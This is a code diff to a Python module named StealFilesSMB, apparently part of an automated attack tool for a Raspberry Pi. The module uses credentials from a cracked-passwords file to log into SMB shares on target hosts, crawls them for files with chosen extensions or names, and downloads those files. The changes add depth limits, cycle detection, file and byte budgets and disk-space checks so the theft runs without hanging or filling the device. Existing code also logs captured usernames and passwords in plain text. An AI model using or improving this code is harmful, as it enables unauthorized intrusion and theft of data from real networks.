@@ -1,4 +1,5 @@
 import os
+import shutil
 import logging
 from rich.console import Console
 from threading import Timer
@@ -19,6 +20,13 @@ b_parent = "SMBBruteforce"
 b_port = 445
 
 IGNORED_SHARES = {'print$', 'ADMIN$', 'IPC$', 'C$', 'D$', 'E$', 'F$', 'Sharename', '---------', 'SMB1'}
+
+# Hard caps so a hostile/looped share cannot hang or fill a 512 MB Pi Zero.
+MAX_DEPTH = 6
+MAX_FILES_PER_RUN = 100
+MAX_FILE_BYTES = 50 * 1024 * 1024   # 50 MB per file
+MAX_RUN_BYTES = 200 * 1024 * 1024   # 200 MB per host run
+MIN_FREE_BYTES = 100 * 1024 * 1024  # refuse write if < 100 MB free
 
 class StealFilesSMB:
     """
@@ -47,16 +55,38 @@ class StealFilesSMB:
             logger.error(f"SMB connection error for {ip} with user '{username}' and password '{password}': {e}")
             return None
 
-    def find_files(self, conn, share_name, dir_path):
+    def find_files(self, conn, share_name, dir_path, depth=0, visited=None):
         """
         Find files in the SMB share based on the configuration criteria.
+
+        depth + visited guards stop cyclic symlink/junction loops from recursing
+        forever and wedging the worker (the hang class #6 targets).
         """
+        if visited is None:
+            visited = set()
         files = []
+        if depth > MAX_DEPTH:
+            return files
+        # Normalize so the same directory reached via different path spellings still collides.
+        key = (share_name, (dir_path or '/').replace(chr(92), '/').rstrip('/') or '/')
+        if key in visited:
+            logger.warning(f"SMB cycle detected at {share_name}:{dir_path}; stopping recurse")
+            return files
+        visited.add(key)
         try:
             for file in conn.listPath(share_name, dir_path):
+                if self.shared_data.orchestrator_should_exit or getattr(self, 'stop_execution', False):
+                    break
+                if len(files) >= MAX_FILES_PER_RUN:
+                    logger.warning(f"SMB file cap ({MAX_FILES_PER_RUN}) reached under {share_name}:{dir_path}")
+                    break
                 if file.isDirectory:
                     if file.filename not in ['.', '..']:
-                        files.extend(self.find_files(conn, share_name, os.path.join(dir_path, file.filename)))
+                        files.extend(self.find_files(
+                            conn, share_name,
+                            os.path.join(dir_path, file.filename),
+                            depth=depth + 1, visited=visited,
+                        ))
                 else:
                     if any(file.filename.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                        any(file_name in file.filename for file_name in self.shared_data.steal_file_names):
@@ -69,16 +99,56 @@ class StealFilesSMB:
     def steal_file(self, conn, share_name, remote_file, local_dir):
         """
         Download a file from the SMB share to the local directory.
+
+        Enforces per-file / per-run byte budgets and a free-space precheck so a
+        large share cannot OOM or fill the SD card on a Pi Zero.
         """
         try:
+            # Free-space precheck
+            try:
+                free = shutil.disk_usage(local_dir if os.path.isdir(local_dir) else os.path.dirname(local_dir) or '/').free
+            except Exception:
+                free = shutil.disk_usage('/').free
+            if free < MIN_FREE_BYTES:
+                logger.error(f"Refusing SMB steal: only {free} bytes free (need {MIN_FREE_BYTES})")
+                self.stop_execution = True
+                return
+
+            if getattr(self, '_run_bytes', 0) >= MAX_RUN_BYTES:
+                logger.warning(f"SMB per-run byte budget ({MAX_RUN_BYTES}) exhausted; stopping")
+                self.stop_execution = True
+                return
+
             local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
             local_file_dir = os.path.dirname(local_file_path)
             os.makedirs(local_file_dir, exist_ok=True)
+
+            # Stream with a hard cap so a single huge file cannot blow the budget.
+            written = [0]
+            def _write(chunk):
+                written[0] += len(chunk)
+                if written[0] > MAX_FILE_BYTES:
+                    raise IOError(f"file exceeds MAX_FILE_BYTES ({MAX_FILE_BYTES})")
+                if getattr(self, '_run_bytes', 0) + written[0] > MAX_RUN_BYTES:
+                    raise IOError(f"run would exceed MAX_RUN_BYTES ({MAX_RUN_BYTES})")
+                f.write(chunk)
+
             with open(local_file_path, 'wb') as f:
-                conn.retrieveFile(share_name, remote_file, f)
-            logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
+                # pysmb retrieveFile writes via a file-like; we wrap to count bytes.
+                class _Cap:
+                    def write(self, data):
+                        _write(data)
+                conn.retrieveFile(share_name, remote_file, _Cap())
+            self._run_bytes = getattr(self, '_run_bytes', 0) + written[0]
+            logger.success(f"Downloaded file from {remote_file} to {local_file_path} ({written[0]} bytes)")
         except Exception as e:
             logger.error(f"Error downloading file {remote_file} from share {share_name}: {e}")
+            # Clean up a partial file so a later retry starts clean.
+            try:
+                if 'local_file_path' in locals() and os.path.exists(local_file_path):
+                    os.unlink(local_file_path)
+            except OSError:
+                pass
 
     def list_shares(self, conn):
         """
@@ -108,6 +178,7 @@ class StealFilesSMB:
                 # success left *_connected True and disarmed the timeout for good.
                 self.stop_execution = False
                 self.smb_connected = False
+                self._run_bytes = 0
                 logger.info(f"Stealing files from {ip}:{port}...")
                 settle_for_display(self.shared_data)  # let the panel show this action's name
                 # Get SMB credentials from the cracked passwords file
